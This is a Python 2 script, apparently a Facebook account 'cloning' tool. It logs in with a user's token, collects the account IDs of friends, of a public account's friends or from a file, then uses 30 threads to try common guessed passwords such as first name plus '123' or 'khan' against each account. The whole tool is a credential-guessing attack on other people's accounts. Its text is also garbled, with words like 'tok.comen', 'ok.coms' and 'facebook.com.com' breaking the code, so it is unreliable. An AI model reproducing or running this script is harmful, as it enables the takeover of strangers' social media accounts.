#!/usr/bin/python2
#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cook.comielib
from multiprocessing.pool import ThreadPool
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    os.system('python2 B4.py')

from requests.exceptions import ConnectionError
from mechanize import Browser

#### browser ####
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#### exit ####
def exb():
	print (R + 'Exit')
	os.sys.exit()

#### clear ####
def cb():
    os.system('clear')

#### time sleep ####
def t():
    time.sleep(1)
def t1():
    time.sleep(0.01)

#### print std ####
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		t1()

#### tok.comen remove ####
def trb():
    os.system('rm -rf tok.comen.txt')

##### LOGO #####
logo='''
\033[1;94m ┈┈┈┈╱▔▔▔▔╲┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈╱▔▔▔▔╲┈┈┈┈
\033[1;94m ┈┈┈▕▕R4 M4▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕R4 M4▏▏┈┈┈
\033[1;94m ┈┈┈▕▕▂╱╲▂▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕▂╱╲▂▏▏┈┈┈
\033[1;94m ┈┈┈┈╲┊┊┊┊╱┈┈┈┈\033[1;94mAliRaza            \033[1;91m┈┈┈┈╲┊┊┊┊╱┈┈┈┈
\033[1;96m ┈┈┈┈▕╲▂▂╱▏┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈▕╲▂▂╱▏┈┈┈┈
\033[1;96m ╱▔▔▔▔┊┊┊┊▔▔▔▔╲☞☞☞☞☞☞\033[1;91m☜☜☜☜☜╱▔▔▔▔┊┊┊┊▔▔▔▔╲
\033[1;96m................\033[1;93mAliRaza\033[1;91m...............
\033[1;96m................\033[1;93m✬🄵🄰🄲🄴🄱🄾🄾🄺✬\033[1;91m..............

\033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

\033[1;91m☞ Auther     : R4_RAZA_M4_MASTER
\033[1;92m☞ WhatsApp   : 03213915156
\033[1;95m☞ YouTube    : Mahummad Ayaan Tricks channel

\033[1;93m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
                                '''
back=0
successfull=[]
checkpoint=[]
ok.coms=[]
cps=[]
id=[]

#### login ####
def login():
	cb()
	try:
		tb=open('tok.comen.txt', 'r')
		menu() 
	except (KeyError,IOError):
		cb()
		print (logo)
		print (R + '◈━━━━▷' + S + ' Login With ✬🄵🄰🄲🄴🄱🄾🄾🄺✬ ' + R + '◁━━━━◈')
		print
		id=raw_input(S + '[☆] ' + S + 'Email: ' + G +'')
		pwd=getpass.getpass(S + '[♡] ' + R + 'Password : ')
		data = urllib.urlopen("https://b-api.facebook.com.com/method/auth.login?access_tok.comen=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cook.comies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		z=json.load(data)
		if 'access_tok.comen' in z:
		    st = open("tok.comen.txt", "w")
		    st.write(z["access_tok.comen"])
		    st.close()
		    print (S + '[☆]' + Y + ' Login successfull 100% ✓')
		    os.system('xdg-open https://www.youtube.com/@mahummadayaantricks9498')
		    menu()
		else:
		    if "www.facebook.com.com" in z["error_msg"]:
		        print (R + 'Account has a checkpoint !')
		        t()
		        login()
		    else:
		        print (R + 'number/user id/ password is wrong !')
		        trb()
		        t()
		        login()
def menu():
	cb()
	try:
		tb=open('tok.comen.txt','r').read()
	except IOError:
		print (R + 'Tok.comen Invalid !')
		trb()
		t()
		login()
	try:
		otw=requests.get('https://graph.facebook.com.com/me?access_tok.comen='+tb)
		a=json.loads(otw.text)
	except KeyError:
		print (G + 'Account has a checkpoint !')
		trb()
		t()
		login()
	except requests.exceptions.ConnectionError:
		print (W + 'No internet connection !')
		t()
		exb()
	cb()
	print (logo)
	print (S + '[☆] ' + G + 'ID Name: ' + R + a['name'])
	print (S + '[☆] ' + G + 'User ID: ' + R + a['id'])
	print
	print (S + 50*'-')
	print
	print (S + '[' + P + '☞1' + S + ']' + S + ' Fast Cloning New Update')
	print (S + '[' + P + '☞2' + S + ']' + S + ' Update R4_RAZA Tool')
	print (S + '[' + P + '☞3' + S + ']' + S + ' R4_RAZA WhatsApp Group')
	print (S + '[' + Y + '☞4' + S + ']' + G + ' Log Out')
	print (S + '[' + Y + '☞0' + S + ']' + R + ' Exit')
	print
	print (S + 50*'-')
	print
	mb()


def mb():
	bm=raw_input(W + ' ✬🄵🄰🄲🄴🄱🄾🄾🄺✬   ')
	if bm =='':
		print (R + 'Select a valid option !')
		mb()
	elif bm =='1':
		pak()
	elif bm =='2':
	    os.system('rm -rf $HOME/R4_RAZA')
	    os.system('cd $HOME && git clone https://github.com/MahummadAyaanTricksz/R4')
	    cb()
	    print (logo)
	    psb('☆10%')
	    psb('☆☆20%')
	    psb('☆☆☆30%')
	    psb('☆☆☆☆40%')
	    psb('☆☆☆☆☆50%')
	    psb('☆☆☆☆☆☆60%')
	    psb('☆☆☆☆☆☆☆70%')
	    psb('☆☆☆☆☆☆☆☆80%')
	    psb('☆☆☆☆☆☆☆☆☆90%')
	    psb('☆☆☆☆☆☆☆☆☆☆100%')
	    psb('Freinds Login New Account✓')
	    psb('WhatsApp Number 03213915156✓')
	    psb('Welcome To R4_RAZA')
	    psb('Congratulations R4_RAZA Tool Has Been Updated Successfully')
	    psb('🔓Username☆ Ali Raza XD✓')
	    psb('🔓Password ☆ Khan1122✓')
	    psb('Subscribe My Youtube Channel Mahummad Ayaan Tricks✓')
	    psb('Please Login Again')
	    time.sleep(2)
	    os.system('cd $HOME/R4_RAZA && python2 B4.py')
	elif bm =='3':
	    os.system('xdg-open https://chat.whatsapp.com/EI8nrph9N6jFoVFOSSj7jo')
	    menu()
	elif bm =='4':
		psb('Tok.comen Has Been Removed')
		trb()
		t()
		exb()
	elif bm =='0':
	    exb()
	else:
		print (R+'Fill in correctly !')
		mb()


def pak():
	global tb
	try:
		tb=open('tok.comen.txt','r').read()
	except IOError:
		print (R + ' Invalid Tok.comen !')
		trb()
		t()
		login()
	cb()
	print (logo)
	print (S + '[' + P + '☞1' + S + ']' + P + ' Clone With Friend List')
	print (S + '[' + P + '☞2' + S + ']' + P + ' Clone From Public Account')
	print (S + '[' + Y + '☞3' + S + ']' + Y + ' Clone From File')
	print (S + '[' + R + '☞0' + S + ']' + R + ' Back')
	print
	print (S + 50*'-')
	print
	pb()

def pb():
	bp=raw_input(W + ' ✬🄵🄰🄲🄴🄱🄾🄾🄺✬   ')
	if bp =='':
		print (R + 'Select a valid option !')
		pb()
	elif bp =='1':
		cb()
		print (logo)
		r=requests.get('https://graph.facebook.com.com/me/friends?access_tok.comen='+tb)
		z=json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif bp=='2':
		cb()
		print (logo)
		idt=raw_input(S + '[☆] ' + G + 'Put Public User ID/User Name: ' + W + '')
		cb()
		print (logo)
		try:
			jok.com=requests.get('https://graph.facebook.com.com/'+idt+'?access_tok.comen='+tb)
			op=json.loads(jok.com.text)
			psb(S + '[☆]' + G + ' Account  Name: ' + W + op['name'])
		except KeyError:
			print (R + ' ID not found !')
			raw_input(R + ' Back')
			pak()
		r=requests.get('https://graph.facebook.com.com/'+idt+'/friends?access_tok.comen='+tb)
		z=json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif bp =='3':
		cb()
		print (logo)
		try:
			idlist=raw_input(S + '[☆] ' + R + 'Enter File Path: ' + G + '')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print (R + ' File Not Fount !')
			raw_input(R + ' Back')
			pak()
	elif bp =='0':
		menu()
	else:
		print (R + ' Select a valid option !')
		pb()
	print (S + '[☆]' + P + ' Total Friends: ' + W + str(len(id)))
	psb(S + '[☆]' + S + ' To Stop Process Click On CTRL ~ Z')
	print
	print (S + 50*'-')
	print
	def main(arg):
		global cps, ok.coms
		user=arg
		try:
			h=requests.get('https://graph.facebook.com.com/'+user+'/?access_tok.comen='+tb)
			j=json.loads(h.text)
			ps1=('786786')
			dt=urllib.urlopen('https://b-api.facebook.com.com/method/auth.login?access_tok.comen=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cook.comies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			k=json.load(dt)
			if 'www.facebook.com.com' in k['error_msg']:
			    print(S+'[RAZA-CP] ♡ '+user+' ♡ '+ps1)
			    cps.append(user+ps1)
			else:
			    if 'access_tok.comen' in k:
			        print (G+'[RAZA-OK] ♡ '+user+' ♡ '+ps1)
			        ok.coms.append(user+ps1)
			    else:
			        ps2=(j['first_name']+'123')
			        dt=urllib.urlopen('https://b-api.facebook.com.com/method/auth.login?access_tok.comen=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cook.comies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			        k=json.load(dt)
			        if 'www.facebook.com.com' in k['error_msg']:
			            print(S+'[RAZA-CP] ♡ '+user+' ♡ '+ps2)
			            cps.append(user+ps2)
			        else:
			            if 'access_tok.comen' in k:
			                print(G+'[RAZA-OK] ♡ '+user+' ♡ '+ps2)
			                ok.coms.append(user+ps2)
			            else:
			                ps3=(j['first_name']+'786')
			                dt=urllib.urlopen('https://b-api.facebook.com.com/method/auth.login?access_tok.comen=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps3)+'&sdk=ios&generate_session_cook.comies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                k=json.load(dt)
			                if 'www.facebook.com.com' in k['error_msg']:
			                    print(S+'[RAZA-CP] ♡ '+user+' ♡ '+ps3)
			                    cps.append(user+ps3)
			                else:
			                    if 'access_tok.comen' in k:
			                        print(G+'[RAZA-OK] ♡ '+user+' ♡ '+ps3)
			                        ok.coms.append(user+ps3)
			                    else:
			                        ps4=(j['first_name']+'12345')
			                        dt=urllib.urlopen('https://b-api.facebook.com.com/method/auth.login?access_tok.comen=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps4)+'&sdk=ios&generate_session_cook.comies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                        k=json.load(dt)
			                        if 'www.facebook.com.com' in k['error_msg']:
			                            print(S+'[RAZA-CP] ♡ '+user+' ♡ '+ps4)
			                            cps.append(user+ps4)
			                        else:
			                            if 'access_tok.comen' in k:
			                                print(G+'[RAZA-OK] ♡ '+user+' ♡ '+ps4)
			                                ok.coms.append(user+ps4)
			                            else:
			                                ps5=('Pakistan')
			                                dt=urllib.urlopen('https://b-api.facebook.com.com/method/auth.login?access_tok.comen=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cook.comies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                                k=json.load(dt)
			                                if 'www.facebook.com.com' in k['error_msg']:
			                                    print(S+'[RAZA-CP] ♡ '+user+' ♡ '+ps5)
			                                    cps.append(user+ps5)
			                                else:
			                                    if 'access_tok.comen' in k:
			                                        print(G+'[RAZA-OK] ♡ '+user+' ♡ '+ps5)
			                                        ok.coms.append(user+ps5)
			                                    else:
			                                        ps6=(j['first_name']+'khan')
			                                        dt=urllib.urlopen('https://b-api.facebook.com.com/method/auth.login?access_tok.comen=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cook.comies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			                                        k=json.load(dt)
			                                        if 'www.facebook.com.com' in k['error_msg']:
			                                            print(S+'[RAZA-CP] ♡ '+user+' ♡ '+ps6)
			                                            cps.append(user+ps6)
			                                        else:
			                                            if 'access_tok.comen' in k:
			                                                print(G+'[RAZA-OK] ♡ '+user+' ♡ '+ps6)
			                                                ok.coms.append(user+ps6)
		except:
			pass
	p=ThreadPool(30)
	p.map(main, id)
	print
	print(S+50*'-')
	print
	print(S+'Process has been completed CP ID Open After 7 Days ')
	print(Y+'Total '+G+'ok.com'+S+'/'+P+'CP'+S+' = '+G+str(len(ok.coms))+S+'/'+R+str(len(cps)))
	print(S+'BlackMafia')     
	print
	raw_input(R + 'Back')
	os.system('python2 R4.py')
if __name__=='__main__':
    login()

